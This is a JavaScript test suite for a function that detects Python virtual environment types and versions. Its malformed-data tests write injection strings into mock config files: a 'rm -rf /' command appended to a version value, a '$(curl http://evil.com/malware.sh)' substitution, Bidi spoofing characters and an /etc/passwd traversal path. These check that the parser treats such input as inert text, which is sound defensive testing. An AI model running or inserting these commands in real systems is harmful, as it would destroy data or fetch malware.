import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, sep } from "node:path";

import { assert, describe, it } from "poku";

import { get_python_command_from_env, getVenvMetadata } from "./pythonutils.js";

const baseTempDir = mkdtempSync(join(tmpdir(), "venv-poku-tests-"));
process.on("exit", () => {
  try {
    rmSync(baseTempDir, { recursive: true, force: true });
  } catch (_e) {
    // Ignore cleanup errors
  }
});

/**
 * Helper function to scaffold a mock environment
 */
const createMockEnv = (subDir, files = {}) => {
  const envPath = join(baseTempDir, subDir);
  mkdirSync(envPath, { recursive: true });
  for (const [filePath, content] of Object.entries(files)) {
    const fullPath = join(envPath, filePath);
    mkdirSync(dirname(fullPath), { recursive: true });
    writeFileSync(fullPath, content);
  }
  return envPath;
};

const dirname = (path) => {
  const parts = path.split(sep);
  parts.pop();
  return parts.join(sep);
};

describe("getVenvMetadata - Baseline & System Environments", () => {
  it("should return system type when no environment variables are provided", () => {
    const meta = getVenvMetadata({});
    assert.deepStrictEqual(meta.type, "system");
    assert.deepStrictEqual(meta.isActive, false);
    assert.deepStrictEqual(meta.path, null);
  });

  it("should return system type when missing VIRTUAL_ENV path doesn't exist", () => {
    const meta = getVenvMetadata({ VIRTUAL_ENV: "/non/existent/path/123" });
    assert.deepStrictEqual(meta.type, "unknown");
    assert.deepStrictEqual(meta.isActive, true);
    assert.deepStrictEqual(meta.path, "/non/existent/path/123");
  });
});

describe("getVenvMetadata - Standard & Modern Python Tools", () => {
  it("should detect a standard venv", () => {
    const venvPath = createMockEnv("standard_venv", {
      "pyvenv.cfg": "version_info = 3.10.4",
      "bin/python3": "",
      "Scripts/python.exe": "",
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: venvPath });
    assert.deepStrictEqual(meta.type, "venv");
    assert.deepStrictEqual(meta.pythonVersion, "3.10.4");
    assert.deepStrictEqual(meta.isActive, true);
    assert.ok(
      meta.pythonExecutable !== null,
      "Should resolve a python executable",
    );
  });

  it("should detect UV environments and extract versions", () => {
    const uvPath = createMockEnv("uv_env", {
      "pyvenv.cfg": "version_info = 3.12.1\nuv = 0.1.24\nhome = /usr/bin",
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: uvPath });
    assert.deepStrictEqual(meta.type, "uv");
    assert.deepStrictEqual(meta.pythonVersion, "3.12.1");
    assert.deepStrictEqual(meta.toolVersion, "0.1.24");
    assert.deepStrictEqual(meta.uv.version, "0.1.24");
  });

  it("should detect in-project Poetry environments", () => {
    const projectPath = createMockEnv("poetry_project", {
      ".venv/pyvenv.cfg": "version_info = 3.11.0",
      "poetry.lock": 'poetry-version = "1.5.0"\n',
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: join(projectPath, ".venv") });
    assert.deepStrictEqual(meta.type, "poetry");
    assert.deepStrictEqual(meta.toolVersion, "1.5.0");
    assert.deepStrictEqual(meta.poetry.projectRoot, projectPath);
  });

  it("should detect global cache Pipenv environments", () => {
    const globalCachePath = createMockEnv(
      `cache${sep}.virtualenvs${sep}myproject-xYz123`,
      {
        "pyvenv.cfg": "version_info = 3.9.0",
      },
    );

    const meta = getVenvMetadata({ VIRTUAL_ENV: globalCachePath });
    assert.deepStrictEqual(meta.type, "pipenv");
  });
});

describe("getVenvMetadata - Modern Build Tools (Rye, Hatch, PDM)", () => {
  it("should detect Rye environments via active flag", () => {
    const ryePath = createMockEnv("rye_env", {
      "pyvenv.cfg": "version_info = 3.10.0",
    });
    const meta = getVenvMetadata({ RYE_ACTIVE: "1", VIRTUAL_ENV: ryePath });
    assert.deepStrictEqual(meta.type, "rye");
  });

  it("should detect PDM environments via lock file", () => {
    const pdmPath = createMockEnv("pdm_project", {
      ".venv/pyvenv.cfg": "version_info = 3.11.2",
      "pdm.lock": "",
    });
    const meta = getVenvMetadata({ VIRTUAL_ENV: join(pdmPath, ".venv") });
    assert.deepStrictEqual(meta.type, "pdm");
  });

  it("should detect Hatch environments via path heuristics", () => {
    const hatchPath = createMockEnv(
      `my_app${sep}.hatch${sep}env${sep}default`,
      {
        "pyvenv.cfg": "version_info = 3.12.0",
      },
    );
    const meta = getVenvMetadata({ VIRTUAL_ENV: hatchPath });
    assert.deepStrictEqual(meta.type, "hatch");
  });
});

describe("getVenvMetadata - Conda, Miniconda, and Pixi", () => {
  it("should detect standard Conda environments and parse packages", () => {
    const condaPath = createMockEnv("conda_env", {
      "conda-meta/history": "==> 2023-01-01 <==\n# conda version: 23.7.2",
      "conda-meta/python-3.11.5.json": '{"version": "3.11.5", "build": "h123"}',
    });

    const meta = getVenvMetadata({ CONDA_PREFIX: condaPath });
    assert.deepStrictEqual(meta.type, "conda");
    assert.deepStrictEqual(meta.toolVersion, "23.7.2");
    assert.deepStrictEqual(meta.pythonVersion, "3.11.5");
  });

  it("should detect Miniconda if prefix contains mini", () => {
    const minicondaPath = createMockEnv("miniconda3", {
      "conda-meta/history": "",
    });

    const meta = getVenvMetadata({ CONDA_PREFIX: minicondaPath });
    assert.deepStrictEqual(meta.type, "miniconda");
  });

  it("should detect Pixi environments based on environment variables", () => {
    const pixiProjectPath = createMockEnv("pixi_proj", {
      ".pixi/envs/default/conda-meta/history": "",
    });

    const meta = getVenvMetadata({
      PIXI_PROJECT_ROOT: pixiProjectPath,
      PIXI_ENVIRONMENT_NAME: "default",
    });
    assert.deepStrictEqual(meta.type, "pixi");
    assert.deepStrictEqual(meta.isActive, true);
    assert.deepStrictEqual(meta.pixi.projectRoot, pixiProjectPath);
  });
});

describe("getVenvMetadata - Bazel & Pyenv Edge Cases", () => {
  it("should detect Bazel hermetic runfiles environments", () => {
    const bazelMeta = getVenvMetadata({}, "/app/bazel-out/k8-opt/bin/my_venv");
    assert.deepStrictEqual(bazelMeta.type, "bazel");
  });

  it("should detect Bazel via WORKSPACE variables", () => {
    const bazelMeta = getVenvMetadata(
      { BUILD_WORKSPACE_DIRECTORY: "/workspace" },
      "/workspace/internal_venv",
    );
    assert.deepStrictEqual(bazelMeta.type, "bazel");
  });

  it("should detect Pyenv roots and extract version", () => {
    const pyenvRoot = createMockEnv("pyenv_home", {});
    const pyenvEnv = join(pyenvRoot, "versions", "3.10.9");

    const meta = getVenvMetadata({
      PYENV_ROOT: pyenvRoot,
      VIRTUAL_ENV: pyenvEnv,
    });
    assert.deepStrictEqual(meta.type, "pyenv");
    assert.deepStrictEqual(meta.pythonVersion, "3.10.9");
  });
});

describe("get_python_command_from_env executable logic", () => {
  it("should fallback to PYTHON_CMD if no executable is found", () => {
    const cmd = get_python_command_from_env({});
    assert.ok(cmd === "python" || cmd === "python3" || typeof cmd === "string");
  });

  it("should return the exact resolved executable path when available", () => {
    const isWin = process.platform === "win32";
    const exePath = isWin ? "Scripts/python.exe" : "bin/python";
    const envPath = createMockEnv("resolved_exe_env", {
      "pyvenv.cfg": "version_info = 3.9.0",
      [exePath]: "",
    });

    const cmd = get_python_command_from_env({ VIRTUAL_ENV: envPath });
    if (isWin) {
      assert.deepStrictEqual(cmd, join(envPath, "Scripts", "python.exe"));
    } else {
      assert.deepStrictEqual(cmd, join(envPath, "bin", "python"));
    }
  });
});

describe("getVenvMetadata - Unicode and Bi-directional (Bidi) Paths", () => {
  it("should handle paths with emojis and complex Unicode", () => {
    const unicodePath = createMockEnv("项目_v1_📁_🐍", {
      "pyvenv.cfg": "version_info = 3.12.0",
      "bin/python3": "",
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: unicodePath });
    assert.deepStrictEqual(meta.type, "venv");
    assert.deepStrictEqual(meta.path, unicodePath);
    assert.deepStrictEqual(meta.pythonVersion, "3.12.0");
  });

  it("should handle Right-to-Left (RTL) Arabic/Hebrew and Bidi overrides in paths", () => {
    const bidiPath = createMockEnv("مجلد_פרויקט_\u202Eexe.elif\u202C", {
      "pyvenv.cfg": "version_info = 3.11.0",
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: bidiPath });
    assert.deepStrictEqual(meta.type, "venv");
    assert.deepStrictEqual(meta.path, bidiPath);
    assert.deepStrictEqual(meta.pythonVersion, "3.11.0");
  });
});

describe("getVenvMetadata - Malicious and Malformed Data Tolerances", () => {
  it("should safely parse malicious-looking injection strings in pyvenv.cfg", () => {
    const maliciousCfg = createMockEnv("malicious_cfg", {
      "pyvenv.cfg": `
        # Standard configs
        version_info = 3.10.4; rm -rf /
        
        # Fake UV injection
        uv = $(curl http://evil.com/malware.sh)
        
        # Bidi spoofing in keys
        \u202Eytiruces\u202C = true
        
        # Broken lines
        = empty key
        no value =
        many = equals = signs = here
      `,
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: maliciousCfg });
    assert.deepStrictEqual(meta.pythonVersion, "3.10.4; rm -rf /");
    assert.deepStrictEqual(meta.type, "uv");
    assert.deepStrictEqual(
      meta.toolVersion,
      "$(curl http://evil.com/malware.sh)",
    );
  });

  it("should survive gracefully when conda python JSON is corrupted/malformed", () => {
    const corruptCondaPath = createMockEnv("corrupt_conda", {
      "conda-meta/history": "# conda version: 24.1.0",
      "conda-meta/python-3.11.json": "{ version: '3.11.5', build: 'x', }",
    });

    const meta = getVenvMetadata({ CONDA_PREFIX: corruptCondaPath });
    assert.deepStrictEqual(meta.type, "conda");
    assert.deepStrictEqual(meta.toolVersion, "24.1.0");
    assert.deepStrictEqual(meta.pythonVersion, "unknown");
  });

  it("should handle regex bypass attempts in poetry.lock", () => {
    const trickyPoetryPath = createMockEnv("tricky_poetry", {
      ".venv/pyvenv.cfg": "version_info = 3.11.0",
      "poetry.lock": `
        [[package]]
        name = "poetry-version"
        version = "not-this-one"
        
        # poetry-version = "9.9.9"
        
        poetry-version   =   "1.5.0-rc.1+bidi\u202Espoof\u202C"
      `,
    });

    const meta = getVenvMetadata({
      VIRTUAL_ENV: join(trickyPoetryPath, ".venv"),
    });

    assert.deepStrictEqual(meta.type, "poetry");
    assert.deepStrictEqual(
      meta.toolVersion,
      "1.5.0-rc.1+bidi\u202Espoof\u202C",
    );
  });

  it("should safely ignore huge binary/junk pyvenv.cfg files", () => {
    const buffer = Buffer.alloc(1024, 0); // 1KB of null bytes
    const junkCfgPath = createMockEnv("junk_cfg", {});
    writeFileSync(join(junkCfgPath, "pyvenv.cfg"), buffer);
    const meta = getVenvMetadata({ VIRTUAL_ENV: junkCfgPath });
    assert.deepStrictEqual(meta.type, "venv");
    assert.deepStrictEqual(meta.pythonVersion, "unknown");
  });
});

describe("getVenvMetadata - Directory Traversal and Suspicious Paths", () => {
  it("should handle directory traversal patterns in environment variables safely", () => {
    const traversalEnv = {
      VIRTUAL_ENV: "../../../../../etc/passwd",
      CONDA_PREFIX: "..\\..\\..\\Windows\\System32",
    };

    const meta = getVenvMetadata(traversalEnv);
    assert.deepStrictEqual(meta.type, "unknown");
    assert.deepStrictEqual(meta.path, "../../../../../etc/passwd");
  });

  const getWhitespaceTestPath = () => {
    if (process.platform === "win32") {
      return "my  weird   path\u00A0";
    }
    return "my\r\nweird\tpath";
  };

  it("should handle extreme whitespace characters in paths", () => {
    const whitespacePath = createMockEnv(getWhitespaceTestPath(), {
      "pyvenv.cfg": "version_info = 3.9",
    });
    const meta = getVenvMetadata({ VIRTUAL_ENV: whitespacePath });
    assert.deepStrictEqual(meta.type, "venv");
    assert.deepStrictEqual(meta.path, whitespacePath);
  });
});

describe("getVenvMetadata - Env Variable Precedence & Overrides", () => {
  it("should prioritize explicitPath over any environment variable", () => {
    const explicitDir = createMockEnv("explicit_override", {
      "pyvenv.cfg": "version_info = 3.9.0",
    });
    const envDir = createMockEnv("env_override", {
      "pyvenv.cfg": "version_info = 3.10.0",
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: envDir }, explicitDir);

    assert.deepStrictEqual(meta.path, explicitDir);
    assert.deepStrictEqual(meta.pythonVersion, "3.9.0");
    assert.deepStrictEqual(meta.isActive, false);
  });

  it("should prioritize VIRTUAL_ENV over CONDA_PREFIX if both exist", () => {
    const meta = getVenvMetadata({
      VIRTUAL_ENV: "/fake/venv/path",
      CONDA_PREFIX: "/fake/conda/path",
    });

    assert.deepStrictEqual(meta.path, "/fake/venv/path");
  });

  it("should fallback gracefully to CONDA_PYTHON_EXE if CONDA_PREFIX is missing", () => {
    const fakeExeDir = createMockEnv("fake_conda_exe", {
      python: "",
    });
    const exePath = join(fakeExeDir, "python");
    const meta = getVenvMetadata({ CONDA_PYTHON_EXE: exePath });
    assert.deepStrictEqual(meta.type, "conda");
    assert.deepStrictEqual(meta.pythonExecutable, exePath);
    assert.deepStrictEqual(meta.path, null);
    assert.deepStrictEqual(meta.isActive, false);
  });
});

describe("getVenvMetadata - File Read Errors and Malformed CFGs", () => {
  it("should parse pyvenv.cfg with bizarre spacing, missing spaces, and empty values", () => {
    const cfgPath = createMockEnv("weird_spacing", {
      "pyvenv.cfg": `
        # No spaces
        version_info=3.10.1
        # Huge gaps
        uv       =      0.1.2
        # Missing value
        empty_key = 
        # Missing key
        = orphan_value
      `,
    });

    const meta = getVenvMetadata({ VIRTUAL_ENV: cfgPath });

    assert.deepStrictEqual(meta.pythonVersion, "3.10.1");
    assert.deepStrictEqual(meta.type, "uv");
    assert.deepStrictEqual(meta.toolVersion, "0.1.2");
  });

  it("should not crash if pyvenv.cfg is actually a directory (EISDIR)", () => {
    const dirCfgPath = join(baseTempDir, "dir_cfg");
    mkdirSync(dirCfgPath, { recursive: true });
    mkdirSync(join(dirCfgPath, "pyvenv.cfg"));
    const meta = getVenvMetadata({ VIRTUAL_ENV: dirCfgPath });
    assert.deepStrictEqual(meta.type, "venv");
    assert.deepStrictEqual(meta.pythonVersion, "unknown");
  });

  it("should handle empty or unreadable conda-meta histories safely", () => {
    const emptyCondaPath = createMockEnv("empty_conda", {
      "conda-meta/history": "",
      "conda-meta/python-3.8.0.json": '{"version": "3.8.0"}',
    });

    const meta = getVenvMetadata({ CONDA_PREFIX: emptyCondaPath });

    assert.deepStrictEqual(meta.type, "conda");
    assert.deepStrictEqual(meta.toolVersion, null);
    assert.deepStrictEqual(meta.pythonVersion, "3.8.0");
  });
});

describe("getVenvMetadata - Modern Tool Local Environment (.venv) Markers", () => {
  it("should detect local Rye venv via project root markers", () => {
    const ryeProj = createMockEnv("rye_proj", {
      ".rye/config": "",
      "requirements.lock": "",
      ".venv/pyvenv.cfg": "version_info = 3.11.0",
    });
    const meta = getVenvMetadata({ VIRTUAL_ENV: join(ryeProj, ".venv") });
    assert.deepStrictEqual(meta.type, "rye");
  });

  it("should detect local PDM venv via project root pdm.lock", () => {
    const pdmProj = createMockEnv("pdm_proj", {
      "pdm.lock": "",
      ".venv/pyvenv.cfg": "version_info = 3.12.2",
    });
    const meta = getVenvMetadata({ VIRTUAL_ENV: join(pdmProj, ".venv") });
    assert.deepStrictEqual(meta.type, "pdm");
  });

  it("should NOT flag poetry/rye/pdm if the folder is NOT named '.venv'", () => {
    const customVenvProj = createMockEnv("custom_venv_proj", {
      "poetry.lock": "",
      "my-custom-env/pyvenv.cfg": "version_info = 3.9.0",
    });
    const meta = getVenvMetadata({
      VIRTUAL_ENV: join(customVenvProj, "my-custom-env"),
    });
    assert.deepStrictEqual(meta.type, "venv");
  });
});
